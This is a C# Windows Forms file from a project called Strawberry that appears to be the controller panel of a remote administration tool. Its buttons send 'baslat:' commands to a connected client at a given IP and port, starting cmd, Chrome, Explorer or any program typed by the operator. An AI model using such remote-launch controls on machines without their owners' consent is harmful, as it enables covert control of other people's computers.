using Strawberry.Araclar;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Strawberry.Formlar
{
    public partial class CalistirForm : Form
    {
        public string ipport;

        public CalistirForm(string gelenip)
        {
            InitializeComponent();

            ipport = gelenip;
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {
            if (textBox1.Text.Trim() != "")
            {
                button4.Enabled = true;
            }
            else
            {
                button4.Enabled = false;
            }
        }

        private void textBox2_TextChanged(object sender, EventArgs e)
        {
            if (textBox2.Text.Trim() != "")
            {
                button5.Enabled = true;
            }
            else
            {
                button5.Enabled = false;
            }
        }

        private void button4_Click(object sender, EventArgs e)
        {
            Server.server.Send(ipport, "baslat:" + textBox1.Text);
        }

        private void button5_Click(object sender, EventArgs e)
        {
            Server.server.Send(ipport, "baslat:" + textBox2.Text);
        }

        private void button1_Click(object sender, EventArgs e)
        {
            Server.server.Send(ipport, "baslat:cmd");
        }

        private void button2_Click(object sender, EventArgs e)
        {
            Server.server.Send(ipport, "baslat:chrome");
        }

        private void button3_Click(object sender, EventArgs e)
        {
            Server.server.Send(ipport, "baslat:explorer");
        }
    }
}
